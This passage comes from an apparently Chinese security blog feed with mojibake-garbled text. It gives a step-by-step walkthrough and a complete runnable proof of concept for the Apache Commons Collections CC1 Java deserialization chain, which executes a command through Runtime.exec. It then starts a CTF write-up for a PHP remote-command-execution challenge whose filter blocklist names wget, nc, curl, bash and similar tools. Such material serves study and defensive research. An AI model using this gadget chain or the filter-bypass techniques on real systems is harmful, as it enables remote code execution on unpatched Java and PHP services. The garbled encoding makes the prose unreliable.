<code>InvokerTransformer</code></strong></h4><p><strong>ä½œç”¨</strong>ï¼šé€šè¿‡åå°„åŠ¨æ€è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œæ˜¯å‘½ä»¤æ‰§è¡Œçš„æœ€ç»ˆè§¦å‘ç‚¹ã€‚<br><strong>å…³é”®ä»£ç </strong>ï¼š</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">public</span> <span class="keyword">Object</span> <span class="keyword">transform</span>(<span class="keyword">Object</span> <span class="keyword">input</span>) &#123;</span><br><span class="line">    <span class="keyword">Method</span> <span class="keyword">method</span> = <span class="keyword">input</span>.getClass().getMethod(iMethodName, iParamTypes);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">method</span>.invoke(<span class="keyword">input</span>, iArgs); // åå°„è°ƒç”¨ä»»æ„æ–¹æ³•</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•éªŒè¯</strong>ï¼š</p><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">InvokerTransformer <span class="literal">it</span> = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;<span class="built_in">String</span>.<span class="keyword">class</span>&#125;, <span class="keyword">new</span> <span class="built_in">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="literal">it</span>.transform(Runtime.getRuntime()); <span class="regexp">// å¼¹å‡ºè®¡ç®—å™¨</span></span><br></pre></td></tr></table></figure><p><strong>ä¸ºä»€ä¹ˆæ˜¯å®ƒï¼Ÿ</strong></p><ul><li>å‚æ•°<code>iMethodName</code>ã€<code>iParamTypes</code>ã€<code>iArgs</code>å®Œå…¨å¯æ§ï¼Œå¯æ„é€ ä»»æ„åå°„è°ƒç”¨ã€‚</li><li>ç±»å®ç°<code>Serializable</code>ï¼Œæ”¯æŒåºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–ã€‚</li></ul><hr><h4 id="æ­¥éª¤2ï¼šæ„å»ºåå°„è°ƒç”¨é“¾-ChainedTransformer"><a href="#æ­¥éª¤2ï¼šæ„å»ºåå°„è°ƒç”¨é“¾-ChainedTransformer" class="headerlink" title="æ­¥éª¤2ï¼šæ„å»ºåå°„è°ƒç”¨é“¾ - ChainedTransformer"></a><strong>æ­¥éª¤2ï¼šæ„å»ºåå°„è°ƒç”¨é“¾ - <code>ChainedTransformer</code></strong></h4><p><strong>é—®é¢˜</strong>ï¼šç›´æ¥è°ƒç”¨<code>Runtime.getRuntime()</code>ä¼šè¢«å®‰å…¨ç­–ç•¥æ‹¦æˆªï¼Œéœ€é€šè¿‡åå°„é“¾é—´æ¥è·å–<code>Runtime</code>å®ä¾‹ã€‚<br><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p><ul><li>**<code>ConstantTransformer</code>**ï¼šè¿”å›å›ºå®šå¯¹è±¡ï¼ˆå¦‚<code>Runtime.class</code>ï¼‰ï¼Œæ— è§†è¾“å…¥ã€‚</li><li>**<code>ChainedTransformer</code>**ï¼šä¸²è”å¤šä¸ª<code>Transformer</code>ï¼Œå‰è€…çš„è¾“å‡ºä½œä¸ºåè€…çš„è¾“å…¥ã€‚</li></ul><p><strong>æ„é€ åå°„é“¾</strong>ï¼š</p><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">Transformer[] chain = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.<span class="keyword">class</span>), <span class="comment">// è¿”å›Runtime.classå¯¹è±¡</span></span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,     <span class="comment">// åå°„è°ƒç”¨getMethod(&quot;getRuntime&quot;)</span></span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;<span class="built_in">String</span>.<span class="keyword">class</span>, Class[].<span class="keyword">class</span>&#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,         <span class="comment">// è°ƒç”¨getRuntime()è·å–å®ä¾‹</span></span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;<span class="built_in">Object</span>.<span class="keyword">class</span>, <span class="built_in">Object</span>[].<span class="keyword">class</span>&#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">Object</span>[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,          <span class="comment">// æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;<span class="built_in">String</span>.<span class="keyword">class</span>&#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer chain = <span class="keyword">new</span> ChainedTransformer(chain);</span><br></pre></td></tr></table></figure><p><strong>é€»è¾‘ç­‰ä»·</strong>ï¼š</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p><strong>ä¸ºä»€ä¹ˆç”¨é“¾ï¼Ÿ</strong></p><ul><li>ç»•è¿‡ç›´æ¥è°ƒç”¨<code>Runtime</code>çš„é™åˆ¶ï¼Œé€šè¿‡åå°„åˆ†æ­¥è·å–å¯¹è±¡ã€‚</li><li>é“¾å¼è°ƒç”¨ç¬¦åˆååºåˆ—åŒ–æ—¶â€œé€æ­¥è§¦å‘â€çš„ç‰¹æ€§ã€‚</li></ul><hr><h4 id="æ­¥éª¤3ï¼šå¯»æ‰¾è§¦å‘ç‚¹-TransformedMap"><a href="#æ­¥éª¤3ï¼šå¯»æ‰¾è§¦å‘ç‚¹-TransformedMap" class="headerlink" title="æ­¥éª¤3ï¼šå¯»æ‰¾è§¦å‘ç‚¹ - TransformedMap"></a><strong>æ­¥éª¤3ï¼šå¯»æ‰¾è§¦å‘ç‚¹ - <code>TransformedMap</code></strong></h4><p><strong>ä½œç”¨</strong>ï¼šè£…é¥°æ™®é€š<code>Map</code>ï¼Œåœ¨ä¿®æ”¹å€¼æ—¶è‡ªåŠ¨è°ƒç”¨<code>Transformer</code>ã€‚<br><strong>å…³é”®æ–¹æ³•</strong>ï¼š</p><ul><li><code>TransformedMap.decorate()</code>ï¼šåˆ›å»ºè£…é¥°åçš„<code>Map</code>å®ä¾‹ã€‚</li><li><code>checkSetValue()</code>ï¼šåœ¨<code>MapEntry.setValue()</code>æ—¶è§¦å‘<code>valueTransformer.transform()</code>ã€‚</li></ul><p><strong>æ„é€ è§¦å‘ç‚¹</strong>ï¼š</p><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Map</span>&lt;<span class="built_in">String</span>, <span class="built_in">String</span>&gt; rawMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">rawMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>); <span class="comment">// éœ€æ³¨æ„ï¼škeyå¿…é¡»ä¸º&quot;value&quot;ï¼ˆè§æ­¥éª¤4ï¼‰</span></span><br><span class="line"><span class="built_in">Map</span> transformedMap = TransformedMap.decorate(rawMap, <span class="keyword">null</span>, chain); <span class="comment">// ç»‘å®šTransformeré“¾</span></span><br></pre></td></tr></table></figure><p><strong>ä¸ºä»€ä¹ˆæ˜¯å®ƒï¼Ÿ</strong></p><ul><li><code>TransformedMap</code>æ˜¯è¿æ¥<code>Map</code>æ“ä½œä¸<code>Transformer</code>è°ƒç”¨çš„æ¡¥æ¢ã€‚</li><li><code>setValue()</code>æ˜¯ååºåˆ—åŒ–è¿‡ç¨‹ä¸­å¯è¢«è‡ªåŠ¨è°ƒç”¨çš„æ–¹æ³•ã€‚</li></ul><hr><h4 id="æ­¥éª¤4ï¼šååºåˆ—åŒ–å…¥å£-AnnotationInvocationHandler"><a href="#æ­¥éª¤4ï¼šååºåˆ—åŒ–å…¥å£-AnnotationInvocationHandler" class="headerlink" title="æ­¥éª¤4ï¼šååºåˆ—åŒ–å…¥å£ - AnnotationInvocationHandler"></a><strong>æ­¥éª¤4ï¼šååºåˆ—åŒ–å…¥å£ - <code>AnnotationInvocationHandler</code></strong></h4><p><strong>ä½œç”¨</strong>ï¼šJDKå†…éƒ¨ç±»ï¼Œååºåˆ—åŒ–æ—¶è‡ªåŠ¨éå†<code>Map</code>å¹¶è°ƒç”¨<code>setValue()</code>ã€‚<br><strong>å…³é”®é€»è¾‘</strong>ï¼š</p><ul><li><code>readObject()</code> â†’ éå†<code>memberValues</code>ï¼ˆ<code>Map</code>ç±»å‹ï¼‰ â†’ è°ƒç”¨<code>MapEntry.setValue()</code>ã€‚</li><li><strong>æ¡ä»¶é™åˆ¶</strong>ï¼š<ol><li><code>memberTypes.get(key)</code>ä¸ä¸ºç©ºï¼ˆéœ€é€‰æ‹©å¸¦æ–¹æ³•çš„æ³¨è§£ç±»ï¼Œå¦‚<code>Target.class</code>ï¼‰ã€‚</li><li><code>key</code>å¿…é¡»ä¸º<code>&quot;value&quot;</code>ï¼ˆç»•è¿‡JDKå†…éƒ¨æ ¡éªŒï¼‰ã€‚</li></ol></li></ul><p><strong>åå°„æ„é€ å®ä¾‹</strong>ï¼š</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Class</span>&lt;?&gt; clazz = <span class="keyword">Class</span>.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">Constructor&lt;?&gt; ctor = clazz.getDeclaredConstructor(<span class="keyword">Class</span>.<span class="keyword">class</span>, Map.<span class="keyword">class</span>);</span><br><span class="line">ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">Object</span> <span class="keyword">handler</span> = ctor.newInstance(Target.<span class="keyword">class</span>, transformedMap); // ä½¿ç”¨Targetæ³¨è§£ç±»</span><br></pre></td></tr></table></figure><p><strong>ä¸ºä»€ä¹ˆæ˜¯Target.classï¼Ÿ</strong></p><ul><li><code>Target</code>æ³¨è§£å®šä¹‰äº†<code>value()</code>æ–¹æ³•ï¼Œæ»¡è¶³<code>memberTypes.get(&quot;value&quot;) != null</code>çš„æ¡ä»¶ã€‚</li></ul><hr><h4 id="æ­¥éª¤5ï¼šç»„è£…Payloadå¹¶è§¦å‘æ¼æ´"><a href="#æ­¥éª¤5ï¼šç»„è£…Payloadå¹¶è§¦å‘æ¼æ´" class="headerlink" title="æ­¥éª¤5ï¼šç»„è£…Payloadå¹¶è§¦å‘æ¼æ´"></a><strong>æ­¥éª¤5ï¼šç»„è£…Payloadå¹¶è§¦å‘æ¼æ´</strong></h4><p><strong>å®Œæ•´POCä»£ç </strong>ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. æ„é€ Transformeré“¾</span></span><br><span class="line">        Transformer[] chain = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. åˆ›å»ºTransformedMap</span></span><br><span class="line">        Map&lt;String, String&gt; rawMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        rawMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;dummy&quot;</span>); <span class="comment">// Keyå¿…é¡»ä¸º&quot;value&quot;ï¼</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(rawMap, <span class="literal">null</span>, chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. åå°„æ„é€ AnnotationInvocationHandler</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; ctor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> ctor.newInstance(Target.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. åºåˆ—åŒ–Payload</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.bin&quot;</span>))) &#123;</span><br><span class="line">            oos.writeObject(handler);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. ååºåˆ—åŒ–è§¦å‘æ¼æ´ï¼ˆæ¨¡æ‹Ÿç›®æ ‡ç¯å¢ƒï¼‰</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;payload.bin&quot;</span>))) &#123;</span><br><span class="line">            ois.readObject(); <span class="comment">// æ­¤å¤„å¼¹å‡ºè®¡ç®—å™¨ï¼</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ–è€…ï¼š</p><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.<span class="keyword">map</span>.TransformedMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.<span class="built_in">Map</span>;  </span><br><span class="line">  </span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">SetValueTest01</span> &#123;  </span><br><span class="line">    public <span class="keyword">static</span> <span class="literal">void</span> main(<span class="built_in">String</span>[] args) &#123;  </span><br><span class="line">        Runtime runtime = Runtime.getRuntime();  </span><br><span class="line"> InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>  </span><br><span class="line"> , <span class="keyword">new</span> Class[]&#123;<span class="built_in">String</span>.<span class="keyword">class</span>&#125;, <span class="keyword">new</span> <span class="built_in">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line"> HashMap&lt;<span class="built_in">Object</span>, <span class="built_in">Object</span>&gt; hashMap = <span class="keyword">new</span> HashMap&lt;&gt;();  </span><br><span class="line"> hashMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line"> <span class="built_in">Map</span>&lt;<span class="built_in">Object</span>, <span class="built_in">Object</span>&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);  </span><br><span class="line"> <span class="keyword">for</span> (<span class="built_in">Map</span>.Entry entry:decorateMap.entrySet())&#123;  </span><br><span class="line">            entry.setValue(runtime);  </span><br><span class="line"> &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="ä¸‰ã€è°ƒè¯•ä¸é‡åˆ°çš„é—®é¢˜"><a href="#ä¸‰ã€è°ƒè¯•ä¸é‡åˆ°çš„é—®é¢˜" class="headerlink" title="ä¸‰ã€è°ƒè¯•ä¸é‡åˆ°çš„é—®é¢˜"></a><strong>ä¸‰ã€è°ƒè¯•ä¸é‡åˆ°çš„é—®é¢˜</strong></h3><h4 id="1-æ–­ç‚¹ä½ç½®"><a href="#1-æ–­ç‚¹ä½ç½®" class="headerlink" title="1. æ–­ç‚¹ä½ç½®"></a>1. <strong>æ–­ç‚¹ä½ç½®</strong></h4><ul><li>**<code>InvokerTransformer.transform()</code>**ï¼šè§‚å¯Ÿåå°„å‚æ•°æ˜¯å¦æŒ‰é“¾ä¼ é€’ï¼ˆåº”ä¾æ¬¡å‡ºç°<code>Runtime.class</code>â†’<code>Method</code>â†’<code>Runtimeå®ä¾‹</code>â†’<code>exec</code>ï¼‰ã€‚</li><li>**<code>TransformedMap.checkSetValue()</code>**ï¼šéªŒè¯æ˜¯å¦è¢«<code>AnnotationInvocationHandler.readObject()</code>è°ƒç”¨ã€‚</li><li>**<code>AnnotationInvocationHandler.readObject()</code>**ï¼šè·Ÿè¸ª<code>memberValues</code>éå†è¿‡ç¨‹ï¼Œæ£€æŸ¥<code>key=&quot;value&quot;</code>æ˜¯å¦æ»¡è¶³æ¡ä»¶ã€‚</li></ul><h4 id="2-å¸¸è§é—®é¢˜"><a href="#2-å¸¸è§é—®é¢˜" class="headerlink" title="2. å¸¸è§é—®é¢˜"></a>2. <strong>å¸¸è§é—®é¢˜</strong></h4><ul><li><strong>è®¡ç®—å™¨æœªå¼¹å‡º</strong>ï¼š<ul><li>æ£€æŸ¥JDKç‰ˆæœ¬æ˜¯å¦ä¸ºâ‰¤8u65ï¼ˆé«˜ç‰ˆæœ¬éœ€æ‰‹åŠ¨ä¿®è¡¥<code>AnnotationInvocationHandler</code>å­—èŠ‚ç ï¼‰ã€‚</li><li>ç¡®è®¤<code>Target.class</code>è¢«æ­£ç¡®å¼•å…¥ï¼ˆ<code>import java.lang.annotation.Target</code>ï¼‰ã€‚</li></ul></li><li><strong>ç©ºæŒ‡é’ˆå¼‚å¸¸</strong>ï¼š<ul><li>ç¡®ä¿<code>TransformedMap</code>çš„<code>key=&quot;value&quot;</code>ï¼ˆå…¶ä»–keyä¼šå¯¼è‡´<code>memberTypes.get(key)=null</code>ï¼‰ã€‚</li></ul></li></ul><hr><h3 id="å››ã€æ€»ç»“ï¼š-1"><a href="#å››ã€æ€»ç»“ï¼š-1" class="headerlink" title="å››ã€æ€»ç»“ï¼š"></a><strong>å››ã€æ€»ç»“ï¼š</strong></h3><ol><li><strong>å®šä½ç»ˆç‚¹</strong>ï¼šæ‰¾åˆ°å¯æ‰§è¡Œå‘½ä»¤çš„ç±»ï¼ˆ<code>InvokerTransformer.transform()</code>ï¼‰ã€‚</li><li><strong>æ„å»ºåå°„é“¾</strong>ï¼šé€šè¿‡<code>ChainedTransformer</code>ä¸²è”åå°„è°ƒç”¨ï¼Œé—´æ¥è·å–<code>Runtime</code>å®ä¾‹ã€‚</li><li><strong>å¯»æ‰¾è§¦å‘åª’ä»‹</strong>ï¼šåˆ©ç”¨<code>TransformedMap</code>å°†<code>Map</code>æ“ä½œè½¬ä¸º<code>Transformer</code>è°ƒç”¨ã€‚</li><li><strong>è¿æ¥å…¥å£</strong>ï¼šé€šè¿‡<code>AnnotationInvocationHandler.readObject()</code>è§¦å‘<code>Map</code>éå†ã€‚</li><li><strong>ç»•è¿‡é™åˆ¶</strong>ï¼š<ul><li>ä½¿ç”¨<code>Target.class</code>æ»¡è¶³<code>memberTypes</code>æ ¡éªŒã€‚</li><li>è®¾ç½®<code>key=&quot;value&quot;</code>ç»•è¿‡JDKå†…éƒ¨é€»è¾‘ã€‚</li></ul></li></ol><blockquote><p>ğŸ’¡ <strong>æ ¸å¿ƒæ€è·¯</strong>ï¼š<br><strong>ååºåˆ—åŒ–æ¼æ´ &#x3D; å¯æ§çš„èµ·ç‚¹ + ä¸²è”çš„è°ƒç”¨é“¾ + å®‰å…¨é£é™©çš„ç»ˆç‚¹</strong>ã€‚â€”â€”ä»ç»ˆç‚¹ï¼ˆRCEï¼‰åå‘æ¨å¯¼ï¼Œæ¯ä¸€æ­¥éœ€ä¸¥æ ¼æ»¡è¶³å‚æ•°ä¼ é€’ä¸æ¡ä»¶çº¦æŸï¼Œæœ€ç»ˆå½¢æˆé€»è¾‘é—­ç¯ã€‚</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025H&amp;NCTFwebé¢˜å¤ç°</title>
      <link href="/2025/06/10/2025H-NCTFweb%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/06/10/2025H-NCTFweb%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="really-ez-rceé¢˜ç›®"><a href="#really-ez-rceé¢˜ç›®" class="headerlink" title="really-ez-rceé¢˜ç›®"></a>really-ez-rceé¢˜ç›®</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type:Â text/html;Â charset=utf-8&#x27;</span>);  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__">Â </span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Number&#x27;</span>]))Â &#123;Â Â Â Â <span class="variable">$inputNumberÂ </span>=Â <span class="variable">$_REQUEST</span>[<span class="string">&#x27;Number&#x27;</span>];  </span><br><span class="line">Â Â Â Â   </span><br><span class="line">Â Â Â Â <span class="keyword">if</span><span class="title function_ invoke__">Â </span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\d/&#x27;</span>,Â <span class="variable">$inputNumber</span>))Â &#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">die</span>(<span class="string">&quot;ä¸è¡Œä¸è¡Œ,ä¸èƒ½è¿™æ ·&quot;</span>);  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">  </span><br><span class="line">Â Â Â Â <span class="keyword">if</span><span class="title function_ invoke__">Â </span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$inputNumber</span>))Â &#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&quot;OK,æ¥ä¸‹æ¥ä½ çŸ¥é“è¯¥æ€ä¹ˆåšå—&quot;</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â   </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span><span class="title function_ invoke__">Â </span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))Â &#123;Â Â Â Â Â Â Â Â Â Â Â Â <span class="variable">$cmdÂ </span>=Â <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â   </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">if</span><span class="title function_ invoke__">Â </span>(!<span class="title function_ invoke__">preg_match</span>(Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="string">&#x27;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\|more|cc|tac|less|head|\.|\&#123;|\&#125;|uniq|copy|%|file|xxd|date|\[|\]|flag|bash|env|!|\?|ls|\&#x27;|\&quot;|id/i&#x27;</span>,Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="variable">$cmdÂ Â Â Â Â Â Â Â Â Â Â Â </span>))Â &#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&quot;ä½ ä¼ çš„å‚æ•°ä¼¼ä¹æŒºæ­£ç»çš„,æ”¾ä½ è¿‡å»å§&lt;br&gt;&quot;</span>;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â &#125;Â <span class="keyword">else</span>Â &#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&quot;nonono,hacker!!!&quot;</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â &#125;  </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><h4 id="1-è§‚å¯Ÿphpä»£ç "><a href="#1-è§‚å¯Ÿphpä»£ç " class="headerlink" title="1.è§‚å¯Ÿphpä»£ç "></a>1.è§‚å¯Ÿphpä»£ç </h4><p>æœªå‘ç°ç›´æ¥è¾“å‡ºflagçš„åœ°æ–¹ï¼Œä½†æœ‰systemå‘½ä»¤ï¼Œé¢„ä¼°ä»å‘½ä»¤è¡Œè·å–flagï¼›<br>å‘ç°ä¸¤ä¸ªå¯æ§å‚æ•°ï¼Œå‚æ•°é¢ä¸´è¿‡æ»¤ï¼›<br>æ€è€ƒç»•è¿‡æ–¹å¼ï¼›</p><h4 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h4><h5 id="Numberå‚æ•°ï¼š"><a href="#Numberå‚æ•°ï¼š" class="headerlink" title="Numberå‚æ•°ï¼š"></a>Numberå‚æ•°ï¼š</h5><p>ç¬¬ä¸€éƒ¨åˆ†ï¼šæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\d/&#x27;</span>, <span class="variable">$inputNumber</span>)) &#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;ä¸è¡Œä¸è¡Œ,ä¸èƒ½è¿™æ ·&quot;</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>**<code>preg_match(&#39;/\d/&#39;, $inputNumber)</code>**ï¼š</p><ul><li><p>è¿™æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å‡½æ•°ã€‚</p></li><li><p><code>&#39;/\d/&#39;</code> æ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¡¨ç¤ºåŒ¹é…ä»»æ„ä¸€ä¸ªæ•°å­—ï¼ˆ0-9ï¼‰ã€‚</p></li><li><p>å¦‚æœ <code>$inputNumber</code> ä¸­åŒ…å«ä»»ä½•æ•°å­—ï¼ˆå³æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æˆåŠŸï¼‰ï¼Œåˆ™æ‰§è¡Œ <code>die(&quot;ä¸è¡Œä¸è¡Œ,ä¸èƒ½è¿™æ ·&quot;);</code>ã€‚</p></li><li><p><code>die()</code> 